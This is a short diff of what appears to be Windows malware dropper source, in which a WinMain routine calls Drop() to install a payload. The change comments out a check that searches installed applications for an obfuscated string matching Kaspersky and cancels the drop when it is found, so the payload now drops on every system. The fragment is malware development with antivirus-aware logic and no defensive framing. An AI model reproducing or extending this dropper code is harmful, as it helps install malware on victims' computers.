@@ -135,16 +135,16 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	IsX64System(&bIsWow64, &bIsOS64);
 
 	bDrop = TRUE;
-	if (!bIsOS64)
-	{
-		WCHAR pKasp[] = { L's', L'p', L'e', L'r', L's', L'k', L'y', 0x0 };
-		PWCHAR pApplicationList = GetApplicationList(FALSE);
+//	if (!bIsOS64)
+//	{
+//		WCHAR pKasp[] = { L's', L'p', L'e', L'r', L's', L'k', L'y', 0x0 };
+//		PWCHAR pApplicationList = GetApplicationList(FALSE);
 
-		if (StrStrI(pApplicationList, pKasp))
-			bDrop = FALSE;
+//		if (StrStrI(pApplicationList, pKasp))
+//			bDrop = FALSE;
 
-		free(pApplicationList);
-	}
+//		free(pApplicationList);
+//	}
 
 	if (!uMelted && bDrop)
 		Drop();
